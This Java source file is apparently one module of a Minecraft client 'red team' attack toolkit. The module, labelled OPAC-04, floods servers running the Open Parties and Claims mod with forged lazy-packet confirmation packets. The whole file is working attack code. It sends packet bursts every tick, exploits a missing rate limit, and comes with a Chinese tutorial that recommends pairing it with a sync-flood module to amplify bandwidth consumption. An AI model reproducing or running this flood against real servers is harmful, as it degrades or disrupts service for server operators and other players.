package com.redblue.red.modules.opac;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * OPAC-04: LazyPacket Confirmation Flood -- exploits zero rate limit on
 * LazyPacketsConfirmationPacket (index 18).
 *
 * Spamming fake confirmations desynchronizes the lazy packet state machine,
 * potentially causing the server to prematurely flush queued packets
 * or skip flow control for this player's connection.
 *
 * Combined with OPAC-02 (sync flood), this can amplify bandwidth consumption
 * by forcing the server to send data it would normally throttle.
 */
public class OPAC04_LazyConfirmFlood implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("openpartiesandclaims", "main");
    private static final int IDX_LAZY_CONFIRM = 18;

    private long lastTick = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofInt("interval", "发包间隔 (tick)", 1, 1, 20),
        ConfigParam.ofInt("burst", "每次突发数量", 5, 1, 50)
    );

    @Override public String id() { return "opac04_lazy_confirm"; }
    @Override public String name() { return "流控确认洪泛"; }
    @Override public String description() { return "伪造LazyPacket确认破坏流控状态机"; }

    @Override
    public String getTutorial() {
        return "[原理]\n"
            + "LazyPacketsConfirmationPacket (ID 18) 完全没有速率限制\n"
            + "伪造确认可使服务器的lazy packet发送器状态不同步\n"
            + "可能导致服务器提前发送排队的数据包或跳过流控\n"
            + "配合OPAC-02同步洪泛使用效果更佳\n\n"
            + "[使用方法]\n"
            + "1. 启用模块自动发送\n"
            + "2. 建议同时启用OPAC-02以放大效果\n\n"
            + "[参数]\n"
            + "突发数量: 每次发送的确认包数量";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("openpartiesandclaims");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        int burst = getParam("burst").map(ConfigParam::getInt).orElse(5);
        for (int i = 0; i < burst; i++) {
            sendConfirmPacket();
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(1);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;

        int burst = getParam("burst").map(ConfigParam::getInt).orElse(5);
        for (int i = 0; i < burst; i++) {
            sendConfirmPacket();
        }
    }

    private void sendConfirmPacket() {
        CompoundTag tag = new CompoundTag();
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_LAZY_CONFIRM);
            buf.writeNbt(tag);
        });
    }
}
